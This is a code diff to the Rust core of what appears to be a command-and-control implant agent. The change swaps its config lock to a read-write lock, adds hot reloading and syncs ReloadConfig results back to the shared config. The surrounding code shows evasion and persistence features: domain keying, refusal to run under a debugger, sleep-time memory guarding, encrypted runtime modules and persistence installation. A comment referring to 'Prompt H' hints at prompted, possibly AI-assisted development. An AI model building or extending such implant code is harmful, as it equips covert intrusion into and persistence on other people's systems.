@@ -34,14 +34,14 @@ pub mod memory_guard;
 pub mod memory_guard;
 
 use anyhow::Result;
-use common::{config::Config, CryptoSession, Message, Transport};
+use common::{CryptoSession, Message, Transport};
 use log::{error, info};
 use std::sync::Arc;
-use tokio::sync::Mutex;
+use tokio::sync::{Mutex, RwLock};
 
 pub struct Agent {
     transport: Arc<Mutex<Box<dyn Transport + Send>>>,
-    config: Arc<Mutex<Config>>,
+    config: config::ConfigHandle,
     /// AES-256-GCM session used to decrypt capability modules deployed at
     /// runtime. Derived from the `module_aes_key` in `agent.toml`, or
     /// a zero key when not configured (development only).
@@ -112,7 +112,7 @@ impl Agent {
         crate::memory_guard::register_session_key(&crypto);
         Ok(Self {
             transport: Arc::new(Mutex::new(transport)),
-            config: Arc::new(Mutex::new(cfg)),
+            config: Arc::new(RwLock::new(cfg)),
             crypto,
         })
     }
@@ -125,7 +125,7 @@ impl Agent {
         #[cfg(feature = "env-validation")]
         {
             let decision = {
-                let cfg = self.config.lock().await;
+                let cfg = self.config.read().await;
                 env_check::enforce(
                     cfg.required_domain.as_deref(),
                     cfg.refuse_when_debugged,
@@ -161,7 +161,7 @@ impl Agent {
                         error!("[memory-guard] error during dormant sleep: {e}");
                     }
                     let recheck = {
-                        let cfg = self.config.lock().await;
+                        let cfg = self.config.read().await;
                         env_check::enforce(
                             cfg.required_domain.as_deref(),
                             cfg.refuse_when_debugged,
@@ -231,7 +231,7 @@ impl Agent {
         // construction; this block documents and validates the same runtime
         // decisions from the active malleable profile.
         {
-            let cfg = self.config.lock().await;
+            let cfg = self.config.read().await;
             let profile = &cfg.malleable_profile;
 
             #[cfg(feature = "ssh-transport")]
@@ -296,6 +296,14 @@ impl Agent {
             }
         }
 
+        #[cfg(feature = "hot-reload")]
+        {
+            let handle = self.config.clone();
+            if let Ok(Some(_watcher)) = config::spawn_config_watcher(handle) {
+                info!("Hot-reload config watcher started");
+            }
+        }
+
         // Optimise hot functions at startup
         #[cfg(feature = "unsafe-runtime-rewrite")]
         if let Err(e) = optimizer::optimize_hot_function("crypto_session_encrypt") {
@@ -305,7 +313,7 @@ impl Agent {
         // Honour opt-in persistence (Prompt H).
         #[cfg(feature = "persistence")]
         {
-            let cfg = self.config.lock().await;
+            let cfg = self.config.read().await;
             if cfg.persistence_enabled {
                 match persistence::install_persistence() {
                     Ok(p) => info!("Persistence installed at {}", p.display()),
@@ -343,16 +351,30 @@ impl Agent {
                 }) => {
                     info!("Received command: {:?}", command);
                     let crypto = self.crypto.clone();
-                    let config = self.config.clone();
+                    let config_handle = self.config.clone();
+                    let command_for_sync = command.clone();
                     let transport = self.transport.clone();
                     tasks.spawn(async move {
+                        let config = Arc::new(Mutex::new(config_handle.read().await.clone()));
                         let (response, audit_event) = handlers::handle_command(
                             crypto,
-                            config,
+                            config.clone(),
                             command,
                             operator_id.as_deref().unwrap_or("admin"),
                         )
                         .await;
+
+                        // handlers::handle_command expects Arc<Mutex<Config>> and
+                        // mutates it for ReloadConfig; persist those updates back
+                        // into the shared runtime config handle.
+                        if matches!(command_for_sync, common::Command::ReloadConfig)
+                            && response.is_ok()
+                        {
+                            let updated_cfg = config.lock().await.clone();
+                            let mut live_cfg = config_handle.write().await;
+                            *live_cfg = updated_cfg;
+                        }
+
                         let mut t = transport.lock().await;
                         if let Err(e) = t.send(Message::AuditLog(audit_event)).await {
                             error!("Failed to send audit log: {}", e);
@@ -387,7 +409,7 @@ impl Agent {
                     let transport = self.transport.clone();
                     let name_clone = module_name.clone();
                     let ver_clone = version.clone();
-                    let verify_key = self.config.lock().await.module_verify_key.clone();
+                    let verify_key = self.config.read().await.module_verify_key.clone();
                     tasks.spawn(async move {
                         let result =
                             handlers::push_module(name_clone.clone(), &encrypted_blob, &crypto, verify_key.as_deref());
